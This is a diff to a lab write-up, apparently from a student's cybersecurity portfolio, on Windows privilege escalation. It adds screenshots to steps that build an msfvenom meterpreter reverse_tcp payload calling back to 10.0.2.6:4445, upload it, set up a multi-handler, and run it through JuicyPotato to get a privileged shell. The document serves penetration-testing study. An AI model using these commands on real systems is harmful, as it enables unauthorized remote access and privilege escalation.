@@ -64,8 +64,31 @@ Windows Privilege Escalation, leveraging tools and techniques to gain unauthoriz
 ### Part 2
 
 - The task began with the creation of a 64-bit Windows meterpreter using MSFvenom. In the Kali terminal, the command **“msfvenom -l payloads | grep windows”** was issued to display a list of Windows payloads. I opted for **“windows/x64/meterpreter/reverse_tcp”**.
+<p align="center">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp9.png" alt="">
+</p>
+  
 - To construct the payload, the command **“msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.6 LPORT=4445 -f exe > windyprivesc.exe”** was executed.
+<p align="center">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp10.png" alt="">
+</p>
+  
 - The subsequent step was to transfer the crafted file to the target machine. Within the meterpreter environment, this was achieved using the **“upload windyprivesc.exe”** command.
+<p align="center">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp11.png" alt="">
+</p>
+  
 - To proceed, the generic multi-handler exploit was required. After launching MSFconsole, I searched for multi handlers. I chose option 5, recognized as a generic payload handler, and configured the payload, LHOST, and LPORT accordingly.
+<p align="center">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp12.png" alt="">
+</p>
+  
 - The core task was to run the exploit within the directory containing both JuicyPotato and the windyprivesc.exe file on the target VM. This operation was performed inside a shell in meterpreter, using the command **“C:\Program Files\jenkins\Scripts>.\JuicyPotato.exe -t * -p windyprivesc.exe -l 4445”**.
+<p align="center">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp13.png" alt="">
+</p>
+  
 - Once redirected to the multi handler and upon gaining access to the shell, the command **“whoami /priv”** was run. The resultant display showed all enabled privileges. To conclude the assignment, I echoed my name into the terminal for verification purposes.
+<p align="center">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp14.png" alt="">
+</p>
